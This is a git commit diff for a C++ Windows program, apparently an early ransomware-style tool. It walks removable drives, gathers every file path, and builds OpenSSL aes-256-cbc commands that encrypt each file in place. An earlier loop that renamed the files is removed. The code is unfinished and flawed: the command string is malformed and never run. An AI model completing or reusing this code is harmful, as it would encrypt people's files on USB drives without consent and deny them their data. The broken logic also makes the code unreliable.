ec69e28a931bd71bf4b455e4121a8d32559ece97
ArtZetD <56314346+ArtZetD@users.noreply.github.com>
2022-10-30 19:04:24 +0300

    new

--- ZeD_Crypto/ZeD_Crypto.cpp
+++ ZeD_Crypto/ZeD_Crypto.cpp
@@ -7,6 +7,10 @@
 #include<fstream>
 #include<iterator>
 #include<cstdio>
+
+#include<openssl/sha.h>
+
+
 namespace filesystem = std::filesystem;
 
 //void get_files(std::vector<std::string>& paths, std::string root_path)
@@ -39,56 +43,37 @@ void get_files(std::vector<std::string>& paths, LPCTSTR root_path)
 	}
 }
 
-
-
-
 int main()
 {
+
 	TCHAR sz_buffer[256];  
 	LPCTSTR buffer_ptr = sz_buffer; 
-	//DWORD d_logical_drive_string;
 	GetLogicalDriveStrings(255, sz_buffer);
-	//LPCTSTR removable_drive_ptr;
 	std::vector<std::string> paths;
+
+
+	
+
+	//system("C://ZeD_Crypto//test.txt -out C://ZeD_Crypto//test.txt -pass passwd.txt"); //-"openssl aes-256-cbc -a -salt -pbkdf2 -in C://ZeD_Crypto//test.txt -out C://ZeD_Crypto//testenc.txt"
+	
+	 std::string ENCRYPT_COMMAND = "openssl aes-256-cbc -a -salt -pbkdf2 -in ";
+	 std::string DECRYPT_COMMAND = "openssl aes-256-cbc -d -a -salt -pbkdf2 -in ";
+	//std::string file_crypt;
 
 	for (buffer_ptr; *buffer_ptr != '\0'; buffer_ptr += _tcsclen(sz_buffer) + 1) 
 	{
-
 		if (GetDriveType(buffer_ptr) == DRIVE_REMOVABLE)
 		{
-			std::cout << "the removable drive has root name - ";
 			get_files(paths, buffer_ptr);
-			std::cout << '\n';
-
-			for (size_t i = 2; i < paths.size(); ++i) // first 2 files is system file
-			{
-				std::string old_path = paths[i]; // 
-				std::string new_path = paths[i]; // 
-				const char point = '.';
-				size_t name_start_iter = new_path.find_last_of('\\');
-				size_t dot = new_path.find_last_of('.');
-				//new_path.erase(name_start_iter, 7);
-
-
-				const char* char_old_path = old_path.c_str();
-				const char* char_new_path = new_path.c_str();
-
-				std::cout << "before rename\n" << old_path << std::endl;
-
-				new_path.insert(dot, "new");
-				std::cout << "after rename\n" << new_path << std::endl;
-
-				std::rename(char_old_path, char_new_path);
-
-			}
-		}
-		else
-		{
-			continue;
-		}
-		
+		}	
 	}
 
-	return 0;
+	for (size_t i = 2; i < paths.size(); ++i)
+	{
+		ENCRYPT_COMMAND += paths[i] + "-out " + paths[i];
+	}
+
+	
 }
+
 
